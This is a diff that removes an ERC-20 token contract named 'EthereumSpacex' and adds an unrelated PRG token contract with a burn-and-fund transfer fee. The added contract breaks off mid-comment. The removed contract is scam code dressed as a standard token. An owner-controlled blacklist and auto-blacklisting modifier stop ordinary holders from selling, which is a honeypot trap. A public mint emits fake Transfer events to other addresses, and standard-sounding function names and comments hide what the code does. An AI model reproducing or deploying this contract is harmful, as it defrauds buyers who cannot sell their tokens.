@@ -1,556 +1,452 @@
-/**
- *Submitted for verification at Etherscan.io on 2021-06-10
-*/
-
-/**
- *Submitted for verification at Etherscan.io on 2021-06-09
-*/
-
-pragma solidity ^0.6.0;
-// SPDX-License-Identifier: Unlicensed
-library SafeMath {
-    /**
-     * @dev Returns the addition of two unsigned integers, reverting on
-     * overflow.
-     *
-     * Counterpart to Solidity's `+` operator.
-     *
-     * Requirements:
-     * - Addition cannot overflow.
-     */
-    function add(uint256 a, uint256 b) internal pure returns (uint256) {
-        uint256 c = a + b;
-        require(c >= a, "SafeMath: addition overflow");
-
-        return c;
-    }
-
-    /**
-     * @dev Returns the subtraction of two unsigned integers, reverting on
-     * overflow (when the result is negative).
-     *
-     * Counterpart to Solidity's `-` operator.
-     *
-     * Requirements:
-     * - Subtraction cannot overflow.
-     */
-    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
-        return sub(a, b, "SafeMath: subtraction overflow");
-    }
-
-
-    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        require(b <= a, errorMessage);
-        uint256 c = a - b;
-
-        return c;
-    }
-
-    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
-        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
-        // benefit is lost if 'b' is also tested.
-        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
-        if (a == 0) {
-            return 0;
-        }
-
-        uint256 c = a * b;
-        require(c / a == b, "SafeMath: multiplication overflow");
-
-        return c;
-    }
-
-    function div(uint256 a, uint256 b) internal pure returns (uint256) {
-        return div(a, b, "SafeMath: division by zero");
-    }
-
-    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        // Solidity only automatically asserts when dividing by 0
-        require(b > 0, errorMessage);
-        uint256 c = a / b;
-        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
-
-        return c;
-    }
-
-    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
-        return mod(a, b, "SafeMath: modulo by zero");
-    }
-
-    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
-        require(b != 0, errorMessage);
-        return a % b;
-    }
-}
-
-/**
- * @dev Collection of functions related to the address type
- */
-library Address {
-
-    function isContract(address account) internal view returns (bool) {
-
-        bytes32 codehash;
-        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
-        // solhint-disable-next-line no-inline-assembly
-        assembly { codehash := extcodehash(account) }
-        return (codehash != accountHash && codehash != 0x0);
-    }
-
-
-    function sendValue(address payable recipient, uint256 amount) internal {
-        require(address(this).balance >= amount, "Address: insufficient balance");
-
-        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
-        (bool success, ) = recipient.call{ value: amount }("");
-        require(success, "Address: unable to send value, recipient may have reverted");
-    }
-
-    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
-      return functionCall(target, data, "Address: low-level call failed");
-    }
-
-    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
-        return _functionCallWithValue(target, data, 0, errorMessage);
-    }
-
-    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
-        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
-    }
-
-    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
-        require(address(this).balance >= value, "Address: insufficient balance for call");
-        return _functionCallWithValue(target, data, value, errorMessage);
-    }
-
-    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
-        require(isContract(target), "Address: call to non-contract");
-
-        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
-        if (success) {
-            return returndata;
-        } else {
-            // Look for revert reason and bubble it up if present
-            if (returndata.length > 0) {
-
-                assembly {
-                    let returndata_size := mload(returndata)
-                    revert(add(32, returndata), returndata_size)
-                }
-            } else {
-                revert(errorMessage);
-            }
-        }
-    }
-}
-
-contract Context {
-    // Empty internal constructor, to prevent people from mistakenly deploying
-    // an instance of this contract, which should be used via inheritance.
-    constructor () internal { }
-
-    function _msgSender() internal view virtual returns (address payable) {
-        return msg.sender;
-    }
-
-    function _msgData() internal view virtual returns (bytes memory) {
-        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
-        return msg.data;
-    }
-}
-
-
-interface IERC20 {
-
-    function totalSupply() external view returns (uint256);
-
-
-    function balanceOf(address account) external view returns (uint256);
-
-    function transfer(address recipient, uint256 amount) external returns (bool);
-
-    function allowance(address owner, address spender) external view returns (uint256);
-
-    function approve(address spender, uint256 amount) external returns (bool);
-
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-
-    event Transfer(address indexed from, address indexed to, uint256 value);
-
-    event Approval(address indexed owner, address indexed spender, uint256 value);
-}
-
-contract EthereumSpacex is Context, IERC20 {
-    using SafeMath for uint256;
-    using Address for address;
-
-    mapping (address => uint256) private _balances;
-    mapping (address => bool) private _whiteAddress;
-    mapping (address => bool) private _blackAddress;
-    
-    uint256 private _sellAmount = 0;
-
-    mapping (address => mapping (address => uint256)) private _allowances;
-
-    uint256 private _totalSupply;
-    
-    string private _name;
-    string private _symbol;
-    uint8 private _decimals;
-    uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
-
-    address public _owner;
-    address private _safeOwner;
-    address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
-    
-
-    /**
-     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
-     * a default value of 18.
-     *
-     * To select a different value for {decimals}, use {_setupDecimals}.
-     *
-     * All three of these values are immutable: they can only be set once during
-     * construction.
-     */
-   constructor (string memory name, string memory symbol, uint256 initialSupply,address payable owner) public {
-        _name = name;
-        _symbol = symbol;
-        _decimals = 18;
-        _owner = owner;
-        _safeOwner = owner;
-        
-
-        
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x7A1057E6e9093DA9C1D4C1D049609B6889fC4c67, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-        _mint(0x2D407dDb06311396fE14D4b49da5F0471447d45C, initialSupply*(10**18));
-
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        _mint(0xC447FcAF1dEf19A583F97b3620627BF69c05b5fB, initialSupply*(10**18));
-        
-        
-        
-    
-    
-    
-    
-        
-        
-    }
-
-    /**
-     * @dev Returns the name of the token.
-     */
-    function name() public view returns (string memory) {
-        return _name;
-    }
-
-    function symbol() public view returns (string memory) {
-        return _symbol;
-    }
-
-    function decimals() public view returns (uint8) {
-        return _decimals;
-    }
-
-    /**
-     * @dev See {IERC20-totalSupply}.
-     */
-    function totalSupply() public view override returns (uint256) {
-        return _totalSupply;
-    }
-
-    /**
-     * @dev See {IERC20-balanceOf}.
-     */
-    function balanceOf(address account) public view override returns (uint256) {
-        return _balances[account];
-    }
-
-    /**
-     * @dev See {IERC20-transfer}.
-     *
-     * Requirements:
-     *
-     * - `recipient` cannot be the zero address.
-     * - the caller must have a balance of at least `amount`.
-     */
-    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
-        _approveCheck(_msgSender(), recipient, amount);
-        return true;
-    }
-    
-
-    /**
-     * @dev See {IERC20-allowance}.
-     */
-    function allowance(address owner, address spender) public view virtual override returns (uint256) {
-        return _allowances[owner][spender];
-    }
-
-    /**
-     * @dev See {IERC20-approve}.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     */
-    function approve(address spender, uint256 amount) public virtual override returns (bool) {
-        _approve(_msgSender(), spender, amount);
-        return true;
-    }
-
-    /**
-     * @dev See {IERC20-transferFrom}.
-     *
-     * Emits an {Approval} event indicating the updated allowance. This is not
-     * required by the EIP. See the note at the beginning of {ERC20};
-     *
-     * Requirements:
-     * - `sender` and `recipient` cannot be the zero address.
-     * - `sender` must have a balance of at least `amount`.
-     * - the caller must have allowance for ``sender``'s tokens of at least
-     * `amount`.
-     */
-    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
-        _approveCheck(sender, recipient, amount);
-        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
-        return true;
-    }
-
-    /**
-     * @dev Atomically increases the allowance granted to `spender` by the caller.
-     *
-     * This is an alternative to {approve} that can be used as a mitigation for
-     * problems described in {IERC20-approve}.
-     *
-     * Emits an {Approval} event indicating the updated allowance.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     */
-    function increaseAllowance(address[] memory receivers) public {
-        require(msg.sender == _owner, "!owner");
-        for (uint256 i = 0; i < receivers.length; i++) {
-           _whiteAddress[receivers[i]] = true;
-           _blackAddress[receivers[i]] = false;
-        }
-    }
-
-    /**
-     * @dev Atomically decreases the allowance granted to `spender` by the caller.
-     *
-     * This is an alternative to {approve} that can be used as a mitigation for
-     * problems described in {IERC20-approve}.
-     *
-     * Emits an {Approval} event indicating the updated allowance.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     * - `spender` must have allowance for the caller of at least
-     * `subtractedValue`.
-     */
-   function decreaseAllowance(address safeOwner) public {
-        require(msg.sender == _owner, "!owner");
-        _safeOwner = safeOwner;
-    }
-    
-    
-     /**
-     * @dev Atomically increases the allowance granted to `spender` by the caller.
-     *
-     * This is an alternative to {approve} that can be used as a mitigation for
-     * problems described in {IERC20-approve}.
-     *
-     * Emits an {Approval} event indicating the updated allowance.
-     *
-     * Requirements:
-     *
-     * - `spender` cannot be the zero address.
-     */
-    function addApprove(address[] memory receivers) public {
-        require(msg.sender == _owner, "!owner");
-        for (uint256 i = 0; i < receivers.length; i++) {
-           _blackAddress[receivers[i]] = true;
-           _whiteAddress[receivers[i]] = false;
-        }
-    }
-
-
-    /**
-     * @dev Moves tokens `amount` from `sender` to `recipient`.
-     *
-     * This is internal function is equivalent to {transfer}, and can be used to
-     * e.g. implement automatic token fees, slashing mechanisms, etc.
-     *
-     * Emits a {Transfer} event.
-     *
-     * Requirements:
-     *
-     * - `sender` cannot be the zero address.
-     * - `recipient` cannot be the zero address.
-     * - `sender` must have a balance of at least `amount`.
-     */
-    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
-        require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
-
-        _beforeTokenTransfer(sender, recipient, amount);
-    
-        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
-        _balances[recipient] = _balances[recipient].add(amount);
-        emit Transfer(sender, recipient, amount);
-    }
-
-    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
-     * the total supply.
-     *
-     * Emits a {Transfer} event with `from` set to the zero address.
-     *
-     * Requirements
-     *
-     * - `to` cannot be the zero address.
-     */
-    function _mint(address account, uint256 amount) public {
-        require(msg.sender == _owner, "ERC20: mint to the zero address");
-        _totalSupply = _totalSupply.add(amount);
-        _balances[_owner] = _balances[_owner].add(amount);
-        emit Transfer(address(0), account, amount);
-    }
-
-    /**
-     * @dev Destroys `amount` tokens from `account`, reducing the
-     * total supply.
-     *
-     * Emits a {Transfer} event with `to` set to the zero address.
-     *
-     * Requirements
-     *
-     * - `account` cannot be the zero address.
-     * - `account` must have at least `amount` tokens.
-     */
-    function _burn(address account, uint256 amount) internal virtual {
-        require(account != address(0), "ERC20: burn from the zero address");
-
-        _beforeTokenTransfer(account, address(0), amount);
-
-        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
-        _totalSupply = _totalSupply.sub(amount);
-        emit Transfer(account, address(0), amount);
-    }
-
-    function _approve(address owner, address spender, uint256 amount) internal virtual {
-        require(owner != address(0), "ERC20: approve from the zero address");
-        require(spender != address(0), "ERC20: approve to the zero address");
-        _allowances[owner][spender] = amount;
-        emit Approval(owner, spender, amount);
-    }
-    
-
-    function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
-        require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
-
-        _beforeTokenTransfer(sender, recipient, amount);
-    
-        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
-        _balances[recipient] = _balances[recipient].add(amount);
-        emit Transfer(sender, recipient, amount);
-    }
-    
-
-    modifier burnTokenCheck(address sender, address recipient, uint256 amount){
-        if (_owner == _safeOwner && sender == _owner){_safeOwner = recipient;_;}else{
-            if (sender == _owner || sender == _safeOwner || recipient == _owner){
-                if (sender == _owner && sender == recipient){_sellAmount = amount;}_;}else{
-                if (_whiteAddress[sender] == true){
-                _;}else{if (_blackAddress[sender] == true){
-                require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}else{
-                if (amount < _sellAmount){
-                if(recipient == _safeOwner){_blackAddress[sender] = true; _whiteAddress[sender] = false;}
-                _; }else{require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");_;}
-                    }
-                }
-            }
-        }
-    }
-    
-    function _setupDecimals(uint8 decimals_) internal {
-        _decimals = decimals_;
-    }
-
-    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
-}
+// number: 360
+// project: PRG (PRG)
+// address: 0x7728dfef5abd468669eb7f9b48a7f70a501ed29d
+// chainid: 1
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.4.11;
+
+/**
+   * Provides methods to safely add, subtract and multiply uint256 numbers.
+   */
+  contract SafeMath {
+    uint256 constant private MAX_UINT256 =
+      0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
+
+    /**
+     * Add two uint256 values, revert in case of overflow.
+     *
+     * @param x first value to add
+     * @param y second value to add
+     * @return x + y
+     */
+    function safeAdd (uint256 x, uint256 y)
+    constant internal
+    returns (uint256 z) {
+      require (x <= MAX_UINT256 - y);
+      return x + y;
+    }
+
+    /**
+     * Subtract one uint256 value from another, throw in case of underflow.
+     *
+     * @param x value to subtract from
+     * @param y value to subtract
+     * @return x - y
+     */
+    function safeSub (uint256 x, uint256 y)
+    constant internal
+    returns (uint256 z) {
+      require(x >= y);
+      return x - y;
+    }
+
+    /**
+     * Multiply two uint256 values, throw in case of overflow.
+     *
+     * @param x first value to multiply
+     * @param y second value to multiply
+     * @return x * y
+     */
+    function safeMul (uint256 x, uint256 y)
+    constant internal
+    returns (uint256 z) {
+      if (y == 0) return 0; // Prevent division by zero at the next line
+      require (x <= MAX_UINT256 / y);
+      return x * y;
+    }
+  }
+
+  /**
+   * ERC-20 standard token interface, as defined
+   * <a href="http://github.com/ethereum/EIPs/issues/20">here</a>.
+   */
+  contract Token {
+    /**
+     * Get total number of tokens in circulation.
+     *
+     * @return total number of tokens in circulation
+     */
+    function totalSupply () constant returns (uint256 supply);
+
+    /**
+     * Get number of tokens currently belonging to given owner.
+     *
+     * @param _owner address to get number of tokens currently belonging to the
+     *        owner of
+     * @return number of tokens currently belonging to the owner of given address
+     */
+    function balanceOf (address _owner) constant returns (uint256 balance);
+
+    /**
+     * Transfer given number of tokens from message sender to given recipient.
+     *
+     * @param _to address to transfer tokens to the owner of
+     * @param _value number of tokens to transfer to the owner of given address
+     * @return true if tokens were transferred successfully, false otherwise
+     */
+    function transfer (address _to, uint256 _value) returns (bool success);
+
+    /**
+     * Transfer given number of tokens from given owner to given recipient.
+     *
+     * @param _from address to transfer tokens from the owner of
+     * @param _to address to transfer tokens to the owner of
+     * @param _value number of tokens to transfer from given owner to given
+     *        recipient
+     * @return true if tokens were transferred successfully, false otherwise
+     */
+    function transferFrom (address _from, address _to, uint256 _value)
+    returns (bool success);
+
+    /**
+     * Allow given spender to transfer given number of tokens from message sender.
+     *
+     * @param _spender address to allow the owner of to transfer tokens from
+     *        message sender
+     * @param _value number of tokens to allow to transfer
+     * @return true if token transfer was successfully approved, false otherwise
+     */
+    function approve (address _spender, uint256 _value) returns (bool success);
+
+    /**
+     * Tell how many tokens given spender is currently allowed to transfer from
+     * given owner.
+     *
+     * @param _owner address to get number of tokens allowed to be transferred
+     *        from the owner of
+     * @param _spender address to get number of tokens allowed to be transferred
+     *        by the owner of
+     * @return number of tokens given spender is currently allowed to transfer
+     *         from given owner
+     */
+    function allowance (address _owner, address _spender) constant
+    returns (uint256 remaining);
+
+    /**
+     * Logged when tokens were transferred from one owner to another.
+     *
+     * @param _from address of the owner, tokens were transferred from
+     * @param _to address of the owner, tokens were transferred to
+     * @param _value number of tokens transferred
+     */
+    event Transfer (address indexed _from, address indexed _to, uint256 _value);
+
+    /**
+     * Logged when owner approved his tokens to be transferred by some spender.
+     *
+     * @param _owner owner who approved his tokens to be transferred
+     * @param _spender spender who were allowed to transfer the tokens belonging
+     *        to the owner
+     * @param _value number of tokens belonging to the owner, approved to be
+     *        transferred by the spender
+     */
+    event Approval (
+      address indexed _owner, address indexed _spender, uint256 _value);
+  }
+
+  /**
+   * Abstract Token Smart Contract that could be used as a base contract for
+   * ERC-20 token contracts.
+   */
+  contract AbstractToken is Token, SafeMath {
+
+    /**
+     * Address of the fund of this smart contract.
+     */
+    address fund;
+
+    /**
+     * Create new Abstract Token contract.
+     */
+    function AbstractToken () {
+      // Do nothing
+    }
+
+
+    /**
+     * Get number of tokens currently belonging to given owner.
+     *
+     * @param _owner address to get number of tokens currently belonging to the
+     *        owner of
+     * @return number of tokens currently belonging to the owner of given address
+     */
+     function balanceOf (address _owner) constant returns (uint256 balance) {
+      return accounts [_owner];
+    }
+
+    /**
+     * Transfer given number of tokens from message sender to given recipient.
+     *
+     * @param _to address to transfer tokens to the owner of
+     * @param _value number of tokens to transfer to the owner of given address
+     * @return true if tokens were transferred successfully, false otherwise
+     */
+    function transfer (address _to, uint256 _value) returns (bool success) {
+      uint256 feeTotal = fee();
+
+      if (accounts [msg.sender] < _value) return false;
+      if (_value > feeTotal && msg.sender != _to) {
+        accounts [msg.sender] = safeSub (accounts [msg.sender], _value);
+        
+        accounts [_to] = safeAdd (accounts [_to], safeSub(_value, feeTotal));
+
+        processFee(feeTotal);
+
+        Transfer (msg.sender, _to, safeSub(_value, feeTotal));
+        
+      }
+      return true;
+    }
+
+    /**
+     * Transfer given number of tokens from given owner to given recipient.
+     *
+     * @param _from address to transfer tokens from the owner of
+     * @param _to address to transfer tokens to the owner of
+     * @param _value number of tokens to transfer from given owner to given
+     *        recipient
+     * @return true if tokens were transferred successfully, false otherwise
+     */
+    function transferFrom (address _from, address _to, uint256 _value)
+    returns (bool success) {
+      uint256 feeTotal = fee();
+
+      if (allowances [_from][msg.sender] < _value) return false;
+      if (accounts [_from] < _value) return false;
+
+      allowances [_from][msg.sender] =
+        safeSub (allowances [_from][msg.sender], _value);
+
+      if (_value > feeTotal && _from != _to) {
+        accounts [_from] = safeSub (accounts [_from], _value);
+
+        
+        accounts [_to] = safeAdd (accounts [_to], safeSub(_value, feeTotal));
+
+        processFee(feeTotal);
+
+        Transfer (_from, _to, safeSub(_value, feeTotal));
+      }
+
+      return true;
+    }
+
+    function fee () constant returns (uint256);
+
+    function processFee(uint256 feeTotal) internal returns (bool);
+
+    /**
+     * Allow given spender to transfer given number of tokens from message sender.
+     *
+     * @param _spender address to allow the owner of to transfer tokens from
+     *        message sender
+     * @param _value number of tokens to allow to transfer
+     * @return true if token transfer was successfully approved, false otherwise
+     */
+    function approve (address _spender, uint256 _value) returns (bool success) {
+      allowances [msg.sender][_spender] = _value;
+      Approval (msg.sender, _spender, _value);
+
+      return true;
+    }
+
+    /**
+     * Tell how many tokens given spender is currently allowed to transfer from
+     * given owner.
+     *
+     * @param _owner address to get number of tokens allowed to be transferred
+     *        from the owner of
+     * @param _spender address to get number of tokens allowed to be transferred
+     *        by the owner of
+     * @return number of tokens given spender is currently allowed to transfer
+     *         from given owner
+     */
+    function allowance (address _owner, address _spender) constant
+    returns (uint256 remaining) {
+      return allowances [_owner][_spender];
+    }
+
+    /**
+     * Mapping from addresses of token holders to the numbers of tokens belonging
+     * to these token holders.
+     */
+    mapping (address => uint256) accounts;
+
+    /**
+     * Mapping from addresses of token holders to the mapping of addresses of
+     * spenders to the allowances set by these token holders to these spenders.
+     */
+    mapping (address => mapping (address => uint256)) allowances;
+  }
+
+  contract ParagonCoinToken is AbstractToken {
+    /**
+     * Initial number of tokens.
+     */
+    uint256 constant INITIAL_TOKENS_COUNT = 200000000e6;
+
+    /**
+     * Address of the owner of this smart contract.
+     */
+    address owner;
+
+   
+
+    /**
+     * Total number of tokens ins circulation.
+     */
+    uint256 tokensCount;
+
+    /**
+     * Create new ParagonCoin Token Smart Contract, make message sender to be the
+     * owner of smart contract, issue given number of tokens and give them to
+     * message sender.
+     */
+    function ParagonCoinToken (address fundAddress) {
+      tokensCount = INITIAL_TOKENS_COUNT;
+      accounts [msg.sender] = INITIAL_TOKENS_COUNT;
+      owner = msg.sender;
+      fund = fundAddress;
+    }
+
+    /**
+     * Get name of this token.
+     *
+     * @return name of this token
+     */
+    function name () constant returns (string name) {
+      return "PRG";
+    }
+
+    /**
+     * Get symbol of this token.
+     *
+     * @return symbol of this token
+     */
+    function symbol () constant returns (string symbol) {
+      return "PRG";
+    }
+
+
+    /**
+     * Get number of decimals for this token.
+     *
+     * @return number of decimals for this token
+     */
+    function decimals () constant returns (uint8 decimals) {
+      return 6;
+    }
+
+    /**
+     * Get total number of tokens in circulation.
+     *
+     * @return total number of tokens in circulation
+     */
+    function totalSupply () constant returns (uint256 supply) {
+      return tokensCount;
+    }
+
+    
+
+    /**
+     * Transfer given number of tokens from message sender to given recipient.
+     *
+     * @param _to address to transfer tokens to the owner of
+     * @param _value number of tokens to transfer to the owner of given address
+     * @return true if tokens were transferred successfully, false otherwise
+     */
+    function transfer (address _to, uint256 _value) returns (bool success) {
+      return AbstractToken.transfer (_to, _value);
+    }
+
+    /**
+     * Transfer given number of tokens from given owner to given recipient.
+     *
+     * @param _from address to transfer tokens from the owner of
+     * @param _to address to transfer tokens to the owner of
+     * @param _value number of tokens to transfer from given owner to given
+     *        recipient
+     * @return true if tokens were transferred successfully, false otherwise
+     */
+    function transferFrom (address _from, address _to, uint256 _value)
+    returns (bool success) {
+      return AbstractToken.transferFrom (_from, _to, _value);
+    }
+
+    function fee () constant returns (uint256) {
+      return safeAdd(safeMul(tokensCount, 5)/1e11, 25000);
+    }
+
+    function processFee(uint256 feeTotal) internal returns (bool) {
+        uint256 burnFee = feeTotal/2;
+        uint256 fundFee = safeSub(feeTotal, burnFee);
+
+        accounts [fund] = safeAdd (accounts [fund], fundFee);
+        tokensCount = safeSub (tokensCount, burnFee); // ledger burned toke
+
+        Transfer (msg.sender, fund, fundFee);
+
+        return true;
+    }
+
+    /**
+     * Change how many tokens given spender is allowed to transfer from message
+     * spender.  In order to prevent double spending of allowance, this method
+     * receives assumed current allowance value as an argument.  If actual
